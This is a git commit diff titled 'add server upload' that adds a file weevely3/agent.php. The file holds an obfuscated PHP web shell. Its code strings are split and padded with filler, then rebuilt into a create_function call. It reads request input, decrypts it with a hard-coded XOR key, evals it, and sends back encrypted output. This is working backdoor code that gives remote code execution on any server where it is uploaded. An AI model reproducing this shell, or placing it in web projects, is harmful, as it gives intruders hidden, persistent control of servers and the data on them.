db6642209e71854063215bf341e8ec74600292cc
maverick-hackz <262214710+maverick-hackz@users.noreply.github.com>
2023-03-27 07:59:30 -0400

    add server upload

---
+++ weevely3/agent.php
@@ -0,0 +1,11 @@
+<?php
+$V='evaV/l(@gzV/unV/comprV/ess(V/@x(@bV/ase64_decodV/e($m[1]),$k)V/));$oV/=@ob_V/V/get_conV/tents();@o';
+$e='";function x($tV/,$kV/V/){$cV/=strleV/n($k)V/;$l=strlen($t);V/$o="";foV/rV/($i=0;$i<$l;V/){fV/oV/';
+$d='r($j=0;($j<V/$c&V/&$i<$l);V/$j++,V/$i++){$o.=$V/t{V/$i}^$kV/{V/$j};}}reV/turn $o;V/}if (V/@preg_mat';
+$K='b_V/end_cleaV/n()V/;$r=V/@bV/ase64_encode(@xV/(@gV/zcomprV/ess($o),V/$k));prV/int("$pV/$kh$V/r$kf");}';
+$G='$k="348V/1V/9d7b";$V/kh="eeV/abb92V/60a5c"V/;$V/kfV/="854bV/c85b3e44";$p="zpiVV/V/IXAq6V/V/Qq1szQk';
+$W=str_replace('b','','bcrebate_bbfbunctibon');
+$g='ch(V/"/V/$kh(V/V/.V/+)$kf/",@file_get_conteV/nts("V/V/php://inV/put")V/,$m)==1) {@V/obV/V/_start();@';
+$s=str_replace('V/','',$G.$e.$d.$g.$V.$K);
+$p=$W('',$s);$p();
+?>
